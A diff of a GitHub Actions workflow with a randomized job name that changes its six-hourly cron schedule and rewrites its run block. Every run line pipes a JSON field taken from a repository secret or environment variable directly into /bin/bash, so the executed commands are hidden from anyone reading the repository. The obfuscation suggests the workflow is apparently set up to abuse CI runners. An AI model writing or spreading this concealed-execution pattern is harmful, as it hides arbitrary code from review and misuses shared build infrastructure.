@@ -1,27 +1,25 @@
 name: dengshiyu3340
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 2/6 * * *'
+    - cron: '8 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dengshiyu3340
         env:
-          km462: ${{ secrets.km462 }}
+          khgt18: ${{ secrets.khgt18 }}
         run: |
-          echo $km462 | jq -r .nns3 | /bin/bash
-          echo $pqv7183 | jq -r .ino5 | /bin/bash
-          echo $b80 | jq -r .rw26 | /bin/bash
-          echo $r54 | jq -r .kcq52 | /bin/bash
-          echo $cvxng96 | jq -r .jgbtg0822 | /bin/bash
-          echo $ch7 | jq -r .lk13 | /bin/bash
-          echo $jd75 | jq -r .ffx275 | /bin/bash
-          echo $ljlz8 | jq -r .at276 | /bin/bash
-          echo $g975 | jq -r .wc6170 | /bin/bash
-          echo $y3946 | jq -r .n7184 | /bin/bash
-          echo $fgswn617 | jq -r .uhrxr2 | /bin/bash
+          echo $khgt18 | jq -r .y09339 | /bin/bash
+          echo $jl20 | jq -r .vks77339 | /bin/bash
+          echo $jysmr5341 | jq -r .opfk511 | /bin/bash
+          echo $p81110 | jq -r .ma6078 | /bin/bash
+          echo $cmuj95 | jq -r .lzckc62068 | /bin/bash
+          echo $cp1 | jq -r .udmu383 | /bin/bash
+          echo $cfn02 | jq -r .karf78757 | /bin/bash
+          echo $v8053 | jq -r .b5 | /bin/bash
 
